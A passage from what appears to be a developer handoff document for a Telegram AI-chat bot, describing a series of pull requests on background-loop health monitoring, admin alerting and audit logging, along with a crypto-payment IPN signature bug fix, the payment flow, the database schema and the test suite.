* `metrics.py` — added `bot_health_alert` to `_LOOP_METRIC_NAMES`;
  `render_metrics` reads `latest_observed_recent_drops()` for the
  gauge so the gauge agrees with the panel + the loop.
* `web_admin.py` — `control_get` reads `latest_observed_recent_drops()`
  and passes it to `compute_bot_status` so the panel agrees with
  the loop.
* `tests/test_bot_health.py` — 4 existing UNDER_ATTACK tests
  updated to use the renamed parameter; 1 new regression test
  pinning the long-uptime-doesn't-false-fire contract.
* `tests/test_bot_health_alert.py` (new) — 23 tests covering env
  parsing, alert formatting, per-admin fault isolation, the pure
  pass (idle, first-incident, hour-anchor dedupe, level
  escalation, recovery, BUSY doesn't page, the panel-cache
  contract, negative-delta clamp, error propagation).

---

#### Stage-15-Step-F follow-up #2: per-loop freshness thresholds (queued 2026-05-01)

The Stage-15-Step-F first slice and follow-up #1 both used a single
`BOT_HEALTH_LOOP_STALE_SECONDS=1800` (30 min) threshold for *every*
expected background loop. That shared knob was wrong on both ends
of the cadence spectrum:

* `model_discovery` ticks every 6h by design — the 30 min threshold
  meant the panel showed DEGRADED 100% of the time (the loop is
  always >30 min past its last tick except for the few seconds
  surrounding each fire).
* `catalog_refresh` ticks at most once per 24h — *worse*, even
  after one tick it would re-flag DEGRADED every time the panel
  refreshed.
* `bot_health_alert` ticks every 60 s — a 5-minute outage of the
  alert loop (the very thing meant to page the operator on real
  incidents) would have been silent on the panel because the 30
  min threshold absorbed it.

Worst of all, on a freshly-booted bot with 0 uptime, *every* loop
that hadn't ticked yet was flagged DEGRADED — so the panel and the
proactive-alert DMs from follow-up #1 would fire DEGRADED on every
restart for the full 30 min until each loop hit its first tick.
For a 24h-cadence loop like `catalog_refresh` this would be
permanent.

This follow-up replaces the single knob with per-loop thresholds:

* **`bot_health.LOOP_CADENCES`** — a small dict mapping each
  registered loop name to its expected interval in seconds. Each
  loop's stale threshold is `2 × cadence + 60 s` (one missed tick
  plus a one-minute safety margin to absorb scheduler jitter).
  Long-cadence loops get long thresholds; short-cadence loops get
  short thresholds. The panel + the alert loop classify
  consistently with each loop's actual cadence.
* **`BOT_HEALTH_LOOP_STALE_<UPPER_NAME>_SECONDS` env overrides** —
  an operator can pin a per-loop threshold via env if the
  cadence-derived default isn't right for their deploy (e.g.
  `BOT_HEALTH_LOOP_STALE_FX_REFRESH_SECONDS=900` to tighten the
  fx-refresh tolerance). Bad values (non-int / non-positive)
  silently fall through to the cadence-derived default — same
  fail-safe convention as the rest of the bot's `_env_int`.
* **Forward-compat**: a future loop opt-in by adding a name to
  `metrics._LOOP_METRIC_NAMES` works *without* touching this
  module — names absent from `LOOP_CADENCES` use the legacy
  single-knob `BOT_HEALTH_LOOP_STALE_SECONDS` (default 1800 s).
* **Per-loop grace window from boot** — a loop that hasn't ticked
  yet on a freshly-booted bot is graced for one stale-threshold
  window from `process_start_epoch`. Beyond that, it's a real
  alarm because by definition every loop should have ticked at
  least once within its threshold. `bot_health.get_process_start_epoch()`
  is the single source of truth — `web_admin._BOT_PROCESS_START_EPOCH`
  now defers to it so the panel's "uptime" tile and the
  classifier's grace check agree.

Bundled bug fix in this PR (real, found while measuring the
classifier's behaviour on a freshly-booted bot): **a freshly-booted
bot with `catalog_refresh` in `expected_loops` showed DEGRADED for
the first 24h** because `compute_bot_status` flagged any loop whose
`last_tick == 0.0` as stale immediately, with no grace window. The
previous behaviour:

* `last_tick = 0.0` (never ticked) → DEGRADED unconditionally.
* `last_tick > 0` and `delta > 1800 s` → DEGRADED.

The fix splits the never-ticked path: a 0.0 last-tick is treated
as "the loop hasn't fired yet but we don't yet have enough uptime
to expect a fire", and only escalates to DEGRADED once
`now - process_start_epoch > stale_threshold`. A new regression
test `test_fresh_boot_does_not_flag_long_cadence_loop_as_stale`
pins the contract: a bot that booted 30 min ago with no
catalog-refresh tick must classify IDLE (not DEGRADED).

What remains for a follow-up PR:

* **Cadence registration via decorator** — the `LOOP_CADENCES`
  dict is currently maintained by hand. A `@register_loop("name",
  cadence_seconds=N)` decorator on the loop function would
  populate the dict at import time, eliminating the
  manual-sync hazard between a loop's actual cadence and the
  classifier's expected cadence.
* ~~**Cadence introspection on the panel** — `/admin/control` could
  show each loop's published cadence + stale threshold next to
  the current "last ticked Ns ago" so the operator can see at a
  glance which loops are overdue.~~
  *shipped in Stage-15-Step-F follow-up #4
  (`bot_health.loop_cadence_seconds` /
  `loop_stale_threshold_seconds` + `/admin/control` heartbeat
  table). See that section below.*
* **`pending_alert` cadence isn't quite 30 min** — the loop wakes
  every `PENDING_ALERT_INTERVAL_MIN` (default 30 min) but only
  ticks the gauge if it actually finds stuck rows. A correctly
  silent alert loop on a healthy deploy means the gauge can lag
  arbitrarily. A follow-up could split into a "loop alive" tick
  (every wake) vs a "found something" tick (current behaviour).

Files in this PR (Stage-15-Step-F follow-up #2):

* `bot_health.py` — `LOOP_CADENCES` dict, `_stale_threshold_seconds`
  helper, `get_process_start_epoch()` accessor, new
  `process_start_epoch` parameter on `compute_bot_status`, grace
  window for never-ticked loops.
* `web_admin.py` — `_BOT_PROCESS_START_EPOCH` now defers to
  `bot_health.get_process_start_epoch()` so the panel + classifier
  agree on the boot reference.
* `tests/test_bot_health.py` — 2 existing tests updated to mock
  the boot epoch (the new grace-period default would otherwise
  hide their DEGRADED assertion); 9 new tests covering the
  cadence-derived threshold contract, env override + fallback,
  unknown-loop legacy fallback, the bug-fix grace window, and the
  module-level boot-epoch accessor.
* `.env.example` — documented the per-loop override convention.

---

#### Stage-15-Step-F follow-up #3: alert-loop audit trail (queued 2026-05-01)

The first slice (PR #131) added the `/admin/control` panel and
`/admin/audit` already records every human admin action there.
Follow-up #1 (PR #132) added the proactive Telegram-DM alert loop.
Until this PR, those DMs went *only* to Telegram — they did not
leave a row in `admin_audit_log`. An operator reviewing what
happened during an incident had to scrape Telegram (and hope
nobody had cleared their chat).

This follow-up wires the alert loop into the existing
`admin_audit_log` table, alongside the human-admin actions, so
`/admin/audit` becomes a single timeline of everything that
happened during an incident:

* **`bot_health_alert._record_alert_audit`** — best-effort hook
  called once per fired DM event (not per recipient: one fan-out
  → one audit row, with delivery counts in `meta`). Best-effort
  in the same sense as `web_admin._record_audit_safe`: every
  exception is logged and swallowed so a DB outage that breaks
  the audit insert never stops the actual DM from going out.
* **Action slugs** — `bot_health_alert` (bad-level transition,
  e.g. healthy → under_attack) and `bot_health_recovery`
  (bad → healthy/idle). The `target` column is the entered
  level (e.g. `under_attack`) so an operator can group rows by
  "what level fired".
* **`actor = "bot_health_alert"`** — distinguishes loop-driven
  rows from human-admin rows (`actor = "web"`). Filter
  `?actor=bot_health_alert` on `/admin/audit` for the
  alert-only feed.
* **`outcome` semantics**:
    * `ok` — at least one admin received the DM.
    * `no_admins_reachable` — every admin blocked the bot or
      raised a TelegramAPIError. The fact that the alert *fired
      but reached nobody* is the kind of silent failure the audit
      log exists to surface.
    * `no_admins_configured` — `ADMIN_USER_IDS` is empty. An
      unconfigured deploy that's actually under attack now leaves
      a trail rather than going completely silent on every channel.
* **`meta` jsonb** — captures level, score, full signals tuple,
  recovered-from level (recovery only), and the per-DM delivery
  counts. Self-contained — the operator doesn't need to
  cross-reference Prometheus to know *why* the alert fired.

Bundled bug fix in this PR (real, found while wiring the new
slugs into the audit-log filter dropdown): **the five
control-panel slugs from PR #131
(`control_force_stop`, `control_disable_all_models`,
`control_enable_all_models`, `control_disable_all_gateways`,
`control_enable_all_gateways`) were being recorded by
`record_admin_audit` at every kill-switch / force-stop call site,
but they were never added to the `AUDIT_ACTION_LABELS` dropdown
on `/admin/audit`**. The rows themselves were stored correctly,
but an operator filtering the audit feed to "kill-switches only"
during an incident review couldn't pick those slugs out of the
dropdown — they had to scroll the full unfiltered feed. A new
test `test_audit_filter_dropdown_includes_control_panel_actions`
pins all five labels (plus the two new alert-loop labels) so a
future PR can't drop them again.

What remains for a follow-up PR:

* **Audit retention policy** — `admin_audit_log` grows forever
  today. A future slice could add a `cron`-style trim of rows
  older than N days, with a config knob for the retention
  window.
* **Alert-row timeline view** — `/admin/audit` is a flat table.
  An incident-focused view that groups consecutive `bot_health_alert`
  rows by level, with the recovery row collapsed into the same
  group, would make 3am triage faster.
* **Per-recipient delivery row** — current contract is one audit
  row per *event*, with delivery counts in `meta`. If a deploy
  ever needs to know exactly *which* admin received the DM, a
  per-recipient row would be needed. Trade-off is audit-log
  noise on a multi-admin deploy. Current contract is intentional.

Files in this PR (Stage-15-Step-F follow-up #3):

* `bot_health_alert.py` — new `_record_alert_audit` helper, hooked
  into `notify_admins_of_health_change` after the DM fan-out
  (and into the no-admins-configured early return). The audit
  insert is best-effort: a DB outage cannot prevent the DM.
* `web_admin.py` — added five PR #131 control-panel slugs and the
  two new alert-loop slugs to `AUDIT_ACTION_LABELS`. Bundled
  bug fix.
* `tests/test_bot_health_alert.py` — 8 new tests covering the
  alert audit row, the recovery audit row, partial delivery,
  zero admins reachable, no admins configured (audit still
  fires), DB-outage doesn't break the DM, BUSY doesn't audit,
  and dedup also suppresses the audit row.
* `tests/test_web_admin.py` — 1 new test pinning the new labels
  appear in the `/admin/audit` dropdown so a future PR can't
  silently drop them.

#### Stage-15-Step-F follow-up #4: DB-backed tunable severity thresholds (queued 2026-05-01)

The four `BOT_HEALTH_*` knobs that drive the classifier
(`BOT_HEALTH_BUSY_INFLIGHT`, `BOT_HEALTH_LOOP_STALE_SECONDS`,
`BOT_HEALTH_IPN_DROP_ATTACK_THRESHOLD`,
`BOT_HEALTH_LOGIN_THROTTLE_ATTACK_KEYS`) used to be env-only — an
operator who wanted to retune any of them after a traffic spike or
a wave of forged IPNs had to redeploy the bot. This follow-up wires
the long-dormant `system_settings` table (seeded since the 0001
baseline migration but never read in code) as a DB-backed overlay
that beats env at runtime, exposes a knob editor on
`/admin/control`, and propagates the new value to every component
(panel, `/metrics`, alert loop) without a process restart.

The plumbing:

* `database.py` — four new `Database` methods on the system_settings
  table: `get_setting(key)`, `upsert_setting(key, value)`,
  `delete_setting(key)`, `list_settings_with_prefix(prefix)`. The
  whole API is intentionally generic (no per-key validation) — the
  caller is responsible for parsing + validating the string value
  before applying it. 50/255-char column limits are enforced
  defensively to match the existing schema. A future feature (e.g.
  the upcoming OpenRouter multi-key panel) reuses these methods
  for any other env knob without touching the DB layer.

* `bot_health.py` — module-level `_THRESHOLD_OVERRIDES` cache,
  `set_threshold_override(name, value)`,
  `clear_threshold_override(name)`,
  `get_threshold_overrides_snapshot()`, and an async
  `refresh_threshold_overrides_from_db(db)` helper. `_env_int`'s
  resolution order is now: in-process override → env → default.
  The refresh helper is fail-safe: a transient DB error keeps the
  previous cache in place so an outage doesn't silently revert to
  env defaults mid-incident. Non-dict returns from the DB layer
  are also tolerated for the same reason.

* `web_admin.py` — `control_get` calls
  `refresh_threshold_overrides_from_db` on every render so a tweak
  made in another replica is reflected in the panel. New
  `_build_thresholds_view()` helper produces one dict per knob with
  the resolved effective value, the source label
  (`db` / `env` / `default`), the current DB override, and the
  per-knob minimum. New `control_thresholds_post` handler does
  full per-knob validation, writes each row via `upsert_setting`
  (or `delete_setting` for blank fields), refreshes the cache, and
  records a single `control_threshold_update` audit row whose
  `meta` carries the diff (old → new for every changed key).
  Route registered at `POST /admin/control/thresholds`.

* `templates/admin/control.html` — new "Severity thresholds" card
  rendering a 4-row table (one per knob) with Effective / Source /
  Default columns plus a number-input for the new value. Blank
  field = clear override + fall through to env / default.
  Submit button + flash banner mirror the kill-switch UX.

**Bundled bug fix.** Audit of `_env_int` while writing the override
plumbing surfaced a real misconfiguration trap: the helper only
refused *negative* env values. With `BOT_HEALTH_BUSY_INFLIGHT=0`
every chat slot tripped BUSY because `inflight_count >= 0` is
trivially true. With `BOT_HEALTH_IPN_DROP_ATTACK_THRESHOLD=0` the
panel / Prometheus / alert loop permanently flagged UNDER_ATTACK on
a healthy bot because `ipn_drops_recent >= 0` is always true. Same
shape for the other two thresholds. An operator who typed `=0`
thinking "0 = disabled" or as a typo would silently turn the
classifier into a constant alarm. Fix: `_env_int` now takes a
`minimum` kwarg (defaults to `1`) and rejects anything below it
with the same warning + default fallback as before. All four
call-sites use the default `minimum=1`. Regression tests cover
all four env knobs.

Files in this PR (Stage-15-Step-F follow-up #4):

* `database.py` — `get_setting` / `upsert_setting` /
  `delete_setting` / `list_settings_with_prefix` on `Database`.
* `bot_health.py` — module-level override cache, public
  set/clear/snapshot helpers, async refresh-from-DB helper, and
  the `_env_int` `minimum` kwarg fix.
* `web_admin.py` — `_build_thresholds_view`, `control_get`
  refresh hook, `control_thresholds_post` handler, route wiring.
* `templates/admin/control.html` — Severity thresholds card.
* `tests/test_bot_health.py` — 12 new tests covering the bug fix
  (one per knob), set/clear semantics, snapshot copy-on-read,
  refresh-from-DB happy path, db-error path, none-db path, and
  non-dict-return path.
* `tests/test_web_admin.py` — 6 new tests covering form render,
  happy-path POST + cache application, blank-clears-override,
  below-minimum rejection, non-int rejection, and CSRF guard.
  Plus a default `list_settings_with_prefix=AsyncMock({})` on
  the shared `_stub_db` so existing control-panel tests still
  pass without per-test wiring.

---

#### Stage-15-Step-F follow-up #4: cadence introspection on /admin/control (queued 2026-05-01)

The Step-F panel (PR #131) and the cadence-derived stale
thresholds (follow-up #2) gave the classifier per-loop knowledge,
but the panel's "Background loop heartbeats" table only showed
*last tick Ns ago* — an operator had to memorise each loop's
expected cadence to answer "is this loop overdue?". The user's
roadmap line:
*"`/admin/control` could show each loop's published cadence +
stale threshold next to the current 'last ticked Ns ago' so the
operator can see at a glance which loops are overdue."*
This PR ships exactly that.

What this PR ships:

* **`bot_health.loop_cadence_seconds(name)`** — public accessor
  returning the integer cadence for a known loop, or `None` for
  unknown names. Same dict the classifier reads, exposed by name
  so the panel can render it next to the live last-tick.
* **`bot_health.loop_stale_threshold_seconds(name)`** — public
  accessor returning the per-loop stale threshold (the number
  of seconds past which the loop is "declared overdue" by both
  the panel and the classifier). Reads `BOT_HEALTH_LOOP_STALE_<NAME>_SECONDS`
  → cadence-derived `2 × cadence + 60s` margin → legacy
  `BOT_HEALTH_LOOP_STALE_SECONDS` knob (in that order). The same
  resolution order the private `_stale_threshold_seconds` uses
  inside `compute_bot_status`, with the legacy fallback bound at
  call time so the panel and the classifier agree by construction.
* **`web_admin._collect_control_signals`** — every per-loop
  snapshot row now carries `cadence_s`, `stale_threshold_s`,
  `next_tick_in_s`, `is_overdue`, and `grace_pending` alongside
  the existing `last_tick_age_s`. The classifier's grace contract
  is mirrored: a never-ticked loop on a freshly-booted bot is
  "warming up" (yellow), not "overdue" (red), until uptime
  exceeds the loop's threshold.
* **`templates/admin/control.html`** — the heartbeat section is
  now a five-column table: *Loop / Cadence / Last tick (with
  next-due hint) / Stale after / Status*. Status renders as a
  colour-coded badge: green `fresh`, yellow `warming up`,
  red `overdue`, muted `no tick`. A short paragraph above the
  table documents the env override convention so an operator
  doesn't have to hunt through `.env.example`.

Bundled bug fix in this PR (real, found while wiring up the
cadence accessors): **`zarinpal_backfill` was in
`metrics._LOOP_METRIC_NAMES` but missing from `LOOP_CADENCES`**.
The 5-min cadence backfill reaper (Stage-15-Step-E #8 follow-up
#2 PR) opted into the heartbeat-gauge plumbing without a
matching cadence registration, so it fell through to the legacy
`BOT_HEALTH_LOOP_STALE_SECONDS=1800` (30 min). On a deploy that
followed convention, that's *six missed ticks* before the
classifier even hinted at a problem — completely defeating the
"flag a single missed tick" contract follow-up #2 was designed
around. Fix: registered `"zarinpal_backfill": 300` so the
threshold lands at the correct 660s. Pinned by a regression test
that asserts every name in `_LOOP_METRIC_NAMES` has a
`LOOP_CADENCES` entry — a future loop opt-in that forgets the
cadence registration will fail loudly at PR-review time.

What remains for a follow-up PR:

* **Cadence registration via decorator** — *shipped in
  Stage-15-Step-F follow-up #5; see below.*
* **Per-loop manual "tick now" button on the panel** — useful
  for operators who want to verify a freshly-deployed loop
  without waiting up to the cadence. Out of scope here because
  it requires a new POST handler + per-loop runner registry.
* **Sparkline / trend column** — current panel is a snapshot.
  A per-loop sparkline of recent tick lag would surface "this
  loop is *trending* toward stale even though it's still fresh
  right now". Trade-off is JS + a server-side ring buffer; not
  worth the complexity until an operator hits the bug.

Files in this PR (Stage-15-Step-F follow-up #4):

* `bot_health.py` — new public accessors
  `loop_cadence_seconds` + `loop_stale_threshold_seconds`,
  added `zarinpal_backfill` to `LOOP_CADENCES` (bug fix), updated
  `__all__`.
* `web_admin.py` — `_collect_control_signals` enriches each loop
  row with cadence/threshold/overdue/grace metadata.
* `templates/admin/control.html` — five-column heartbeat table
  with colour-coded status badges and an env-override hint.
* `tests/test_bot_health.py` — 7 new tests covering the
  accessors + the cadence-coverage invariant for
  `_LOOP_METRIC_NAMES`.
* `tests/test_web_admin.py` — 7 new tests covering the snapshot
  enrichment (fresh / overdue / never-ticked-grace /
  past-grace-overdue) and the rendered HTML (cadence column,
  status badge, env override hint).

#### Stage-15-Step-F follow-up #5: cadence registration via decorator (queued 2026-05-02)

Goal: replace the hand-maintained `LOOP_CADENCES` dict + the
hand-maintained `metrics._LOOP_METRIC_NAMES` tuple with a
single decorator-based registration so a new loop's cadence
and metric name are declared *once*, at the loop's definition
site, and the two registries auto-populate at import time.

Motivation: PR #157 caught (and fixed) the
`zarinpal_backfill` slip — it was in `_LOOP_METRIC_NAMES` but
missing from `LOOP_CADENCES`, so its 5-min loop fell back to
the legacy 30-min stale threshold. The new decorator prevents
that whole class of bug by construction: registering a name
in one place automatically registers it in the other.

API:

```python
from bot_health import register_loop

@register_loop("fx_refresh", cadence_seconds=600)
async def refresh_usd_to_toman_loop(...):
    ...
```

Or, for tick sites that aren't a single forever-loop function
(e.g. the TTL-gated `catalog_refresh` heartbeat lives inside
`get_catalog`):

```python
register_loop("catalog_refresh", cadence_seconds=CATALOG_TTL_SECONDS)
```

Side effects of every `register_loop(name, cadence_seconds=N)`:

1. Sets `bot_health.LOOP_CADENCES[name] = N` so
   `loop_cadence_seconds(name)` and the cadence-derived stale
   threshold are pinned for *name*.
2. Appends *name* to `metrics._LOOP_METRIC_NAMES` so the
   heartbeat gauge `meowassist_<name>_last_run_epoch` is
   exposed via `/metrics` and the `/admin/control` panel
   iterates this loop.

Idempotency: re-registering the same `(name, cadence)` pair is
a no-op. Registering the same name twice with *different*
cadences raises `RuntimeError` so a stale literal in one place
can't drift from the other.

How `LOOP_CADENCES` is now built: every loop module's
`@register_loop(...)` (or module-level `register_loop(...)`
call for non-loop tick sites) fires at import time. `main.py`
imports each loop module at startup, so by the time the first
`/metrics` scrape or `/admin/control` GET runs, both the
cadence dict and the metric-names tuple are fully populated.
Tests trigger the same import via `tests/conftest.py` (one-line
imports of every loop module — registrations are commutative
and idempotent so order doesn't matter).

Bundled bug fix: `openrouter_keys._read_env_keys` did not
mirror `load_keys`'s "numbered slots win, bare ignored"
semantics. With both `OPENROUTER_API_KEY=BARE` and
`OPENROUTER_API_KEY_1..N` set, the helper returned
`[BARE, *numbered]` while `load_keys` produced
`["numbered_1", ...]` — a one-entry mismatch. That broke
`refresh_from_db`'s no-op fast path (`_keys != desired` always)
AND caused the rebuild branch to duplicate the last numbered
slot into the in-process pool (the slice
`desired[len(_keys):]` over-shot by one). Fix matches
`load_keys` exactly: numbered slots win, bare honoured only
when no numbered slot is set. Pinned by 5 new tests in
`tests/test_openrouter_keys.py`.

Files in this PR (Stage-15-Step-F follow-up #5):

* `bot_health.py` — new `register_loop()` decorator + helper
  `reset_loop_registry_for_tests()`, emptied initial
  `LOOP_CADENCES`, updated `__all__`.
* `metrics.py` — emptied initial `_LOOP_METRIC_NAMES`; the
  tuple is now populated by `register_loop()` calls at import.
* `payments.py`, `fx_rates.py`, `model_discovery.py`,
  `models_catalog.py`, `pending_alert.py`,
  `pending_expiration.py`, `bot_health_alert.py`,
  `zarinpal_backfill.py` — added `from bot_health import
  register_loop` import + `@register_loop(...)` decoration on
  the loop function (or module-level call for
  `models_catalog.py`).
* `openrouter_keys.py` — bundled bug fix in `_read_env_keys`.
* `tests/conftest.py` — eagerly imports every loop module so
  the registry is populated before any test inspects it.
* `tests/test_bot_health.py` — 11 new tests covering the
  decorator API: registry population, decorator-form
  identity, idempotency, mismatch error, type/value
  validation (empty/None/non-positive/bool/float cadence),
  end-to-end threshold-derivation, and an "all 8 production
  loops registered" pin.
* `tests/test_openrouter_keys.py` — 6 new tests covering the
  `_read_env_keys` bug fix and the `refresh_from_db` no-op
  fast path with both bare + numbered env vars.

What remains for a follow-up PR:

* **Per-loop manual "tick now" button on the panel**
  *shipped in Stage-15-Step-F follow-up #6 (`web_admin.control_loop_tick_now_post`); see below.*
* **Sparkline / trend column** — still deferred per the
  trade-off in follow-up #4's notes.

---

#### Stage-15-Step-F follow-up #6: per-loop manual "tick now" button (queued 2026-05-02)

The cadence-introspection PR (follow-up #4) surfaced each loop's
heartbeat age but gave the operator no way to *poke* a loop without
SSHing in. Operators verifying a freshly-deployed loop had to wait
up to its cadence — 24 h for `catalog_refresh`, 6 h for
`model_discovery` — before the panel proved the loop actually
worked. This PR adds a "Tick now" button per loop row that runs a
single iteration on demand.

What this PR ships:

* **`bot_health.LOOP_RUNNERS` registry** — a dict of
  `name -> async (app) -> Awaitable[Any]` populated by the same
  `@register_loop` decorator that already populates `LOOP_CADENCES`.
  The decorator now accepts an optional `runner=` keyword. Each
  runner gathers its own dependencies (the bot, env-derived config)
  from the aiohttp `app` rather than relying on closures over
  module-level state — which lets the panel call any registered
  loop's "once" body uniformly.
* **`bot_health.loop_runner(name)`** — public lookup. Returns
  `None` for unregistered names so the POST handler can 302 with
  a flash instead of 500-ing.
* **All 8 production loops register a runner** —
  `_tick_*_from_app` shims that mirror what the loop's main body
  does once: `min_amount_refresh` calls
  `refresh_min_amounts_once(SUPPORTED_PAY_CURRENCIES)`,
  `pending_alert` allocates a fresh `state` set so the manual
  tick bypasses the loop's hour-bucket dedupe (operator wants to
  *see* the alert), `bot_health_alert` similarly uses a fresh
  `AlertLoopState`, etc. Loops needing a bot raise a clear
  `RuntimeError` if `APP_KEY_BOT` isn't wired up — better a
  diagnosable error than a silent no-op.
* **`POST /admin/control/loop/{name}/tick-now`** — new handler in
  `web_admin.py`. CSRF-guarded, auth-required. Looks up the
  runner via `bot_health.loop_runner`, audit-logs the action
  *before* invoking, and runs the runner under
  `asyncio.wait_for(_, timeout=60s)` so a wedged outbound
  connection can't tie up the request worker. 302s back to
  `/admin/control` with success/error/timeout flash. Heartbeat
  metrics update through the runner's normal
  `record_loop_tick(name)` path — the panel reads exactly as if
  the loop had naturally fired, no separate "tick-now" gauge.
* **Template button** — `templates/admin/control.html` grew an
  "Action" column on the heartbeats table. Each row with
  `has_runner=True` renders a small `btn-tick` form posting to
  the new endpoint with the CSRF token. Loops without a runner
  (e.g. a future loop in development) render a `—` placeholder.
* **`_collect_control_signals` plumbing** — each loop dict now
  carries `has_runner: bool` reflecting whether the registry has
  a runner for that name, so the template can hide the button
  for unconfigured loops without a 500.

**Bundled bug fix:** the panel rendered "(overdue by Ns)" any
time the loop's age passed its cadence — but the classifier's
actual overdue threshold is ≈ 2× cadence + 60 s. So in the grace
window between cadence and stale-threshold, the panel said
"overdue" while the status badge said "fresh" and the gauge stayed
green. Confusing for ops triaging the page during an actual
incident — they couldn't tell which of the multiple "overdue"
loops were genuinely degraded.

Fix: `_collect_control_signals` now sets a separate
`is_running_late` flag for the cadence-but-not-stale grace window,
mutually exclusive with `is_overdue` (the more severe one wins).
The template renders three distinct sub-text strings in priority
order:
* `is_overdue` → "(overdue by ~Ns)"
* `is_running_late` → "(running late ~Ns)"
* otherwise → "(next in ~Ns)"

Pinned by 3 new tests in `tests/test_web_admin.py` covering each
of the three states (`fresh_tick_not_running_late`,
`running_late_distinct_from_overdue`, `overdue_tick_not_running_late`)
so the grace-window classification can't drift back into
"running late = overdue" again.

Files in this PR (Stage-15-Step-F follow-up #6):
* `bot_health.py` — `LOOP_RUNNERS` dict, `runner=` keyword on
  `register_loop`, `loop_runner()` public accessor, updated
  `reset_loop_registry_for_tests` to also clear runners.
* `payments.py` / `fx_rates.py` / `model_discovery.py` /
  `models_catalog.py` / `pending_alert.py` /
  `pending_expiration.py` / `bot_health_alert.py` /
  `zarinpal_backfill.py` — `_tick_*_from_app` shim per loop,
  passed as `runner=` to `register_loop`.
* `web_admin.py` — `control_loop_tick_now_post` handler,
  `_TICK_NOW_TIMEOUT_SECONDS` constant, route registration in
  `setup_admin_routes`, `has_runner` + `is_running_late` flags
  in `_collect_control_signals`.
* `templates/admin/control.html` — new `Action` column with
  `btn-tick` form, three-way conditional render for the
  next-tick sub-text.
* `tests/test_bot_health.py` — 6 new tests covering the
  `runner=` keyword (accept/omit/reject-non-callable/swap),
  `loop_runner` lookup, and an "all 8 loops have runners" pin.
* `tests/test_web_admin.py` — 12 new tests covering the new
  signals shape (`has_runner`, `is_running_late`), the panel
  rendering the new button per loop, and the POST handler's
  CSRF / auth / unknown-loop / no-runner / happy / exception /
  timeout paths.

What remains for a follow-up PR:

* **Sparkline / trend column** — still deferred per the
  trade-off in follow-up #4's notes.

---

## 6. The IPN signature bug we were stuck on (kept for context)

### Symptom (from prod log 2026-04-27 16:12:01 UTC)
```
WARNING bot.payments: IPN sig mismatch:
  expected=6ac370a7..f0d64f68
  received=691300cd..b1ae2324
  secret_len=32 body_len=585 canonical_len=625
```

### Root cause
Persian `order_description = "شارژ کیف پول"` got escaped to `\uXXXX`
(6 bytes/char) by `json.dumps(ensure_ascii=True)`, while NowPayments
signs the raw UTF-8 body (~2 bytes/char). 40-byte length gap = HMAC mismatch.

### Fix (PR #39 + PR #41)
- `ensure_ascii=False` in canonical re-serialization (#39).
- Two-pass verifier — try the **raw body bytes first**, fall back to
  re-canonicalization (#41). Stripe / Paddle / GitHub all sign the raw
  body; we now do the same.

User confirmed clean log on 2026-04-28 (PR was already merged & redeployed).

---

## 7. Money-flow walkthrough (so you understand what NOT to break)

```
User taps "Charge wallet" → picks $5/$10/$25/custom → picks currency
    │
    ▼
handlers.process_charge_*  →  payments.create_crypto_invoice(...)
    │
    ├─ POST /v1/payment to NowPayments → returns {payment_id, pay_address, ...}
    ├─ db.create_pending_transaction(...)              ← PENDING row
    └─ Bot shows the user the invoice address + amount

[user pays on-chain]

NowPayments POSTs to /nowpayments-webhook with x-nowpayments-sig header
    │
    ▼
payments.payment_webhook
    ├─ _verify_ipn_signature(raw_body, header)         ← HMAC-SHA512
    │     └─ 401 if bad. STOP. No balance changes.
    │
    ├─ status == "finished":
    │     └─ db.finalize_payment(payment_id, full_price_usd)
    │            credit (full_price_usd - already_credited), set SUCCESS,
    │            consume promo (if any), all in ONE DB transaction.
    │
    ├─ status == "partially_paid":
    │     └─ actually_paid_usd = actually_paid / pay_amount * price_amount
    │        db.finalize_partial_payment(...)
    │            credit only the new delta, status PENDING|PARTIAL → PARTIAL.
    │
    ├─ status in {expired, failed, refunded}:
    │     └─ db.mark_transaction_terminal(...) — accepts PENDING ∪ PARTIAL.
    │
    ├─ status in {waiting, confirming, confirmed, sending}:    no-op.
    └─ unknown:                                               no-op.
```

**Invariants:**
1. Wallet credit + ledger row update happen in **one DB transaction**.
2. Every credit is gated on `WHERE status IN ('PENDING','PARTIAL')` so a
   replayed IPN cannot mint money.
3. `_verify_ipn_signature` returns False on missing secret / missing header /
   bad JSON / mismatched HMAC → 401. **Never** read the body without
   verifying.
4. `actually_paid` from a `partially_paid` IPN is in the **pay-currency**
   (e.g. TRX), NOT USD. Convert via `actually_paid / pay_amount * price_amount`.

---

## 8. Schema (post-cleanup)

Alembic owns the schema. Read `alembic/versions/0001_baseline.py` for the
canonical truth. Two tables are "money tables" — touch them only with
care:

- `users` — wallet, free messages remaining, language, active model.
- `transactions` — ledger. **Every** balance change writes a row.
  - `gateway` ∈ {`nowpayments`, `admin`} (admin set via `Database.admin_adjust_balance`).
  - `status` ∈ {PENDING, PARTIAL, SUCCESS, EXPIRED, FAILED, REFUNDED}.
  - `gateway_invoice_id` UNIQUE — gives a free duplicate-click guard.
  - `notes` TEXT — human-readable reason on admin adjustments (alembic 0002).
- `usage_logs` — append-only AI request log. Used for cost analytics.
- `system_settings` — singleton-ish key/value store.
- `promo_codes` + `promo_usage` — discount codes (P2-5).
- `conversation_messages` — opt-in conversation memory buffer (P3-5).

Two tables added by **Stage-8-Part-3** (alembic 0003, this PR):
- `gift_codes (code TEXT PK, amount_usd DECIMAL(10,4), max_uses INT NULL, used_count INT, expires_at TIMESTAMPTZ NULL, is_active BOOLEAN, created_at TIMESTAMPTZ)`
- `gift_redemptions (code TEXT REFERENCES gift_codes ON DELETE CASCADE, telegram_id BIGINT REFERENCES users ON DELETE CASCADE, redeemed_at TIMESTAMPTZ, transaction_id INT REFERENCES transactions(transaction_id) ON DELETE SET NULL, PRIMARY KEY (code, telegram_id))`

---

## 9. Test suite

**860 tests** as of Stage-9-Step-10 (durable broadcast job registry) — 15 test modules:

```
tests/
├── conftest.py                            # adds repo root to sys.path
├── test_admin.py                          # 93 cases (gate, parsers, formatters, broadcast, _escape_md,
│                                          #            ASCII-only promo code rejection)
├── test_alembic_env.py                    # 12 cases (DB_URL building w/ special chars in password)
├── test_custom_amount_validation.py       # 21 cases (NaN/Inf/bounds)
├── test_database_queries.py               # 18 cases (revenue filter regression,
                                           #            search_users dispatch, summary limit clamp,
                                           #            list_transactions pagination + filter composition,
                                           #            iter_broadcast_recipients active-days cap)
├── test_fsm_storage.py                    # 3 cases (build_fsm_storage selection)
├── test_handlers_from_user_guard.py       # 4 cases (promo, custom_amount, cmd_start, _route_legacy_text_to_hub)
├── test_ipn_signature.py                  # 11 cases (raw + canonical paths, persian descr regression)
├── test_pricing.py                        # 22 cases (per-model lookup, markup, fallback,
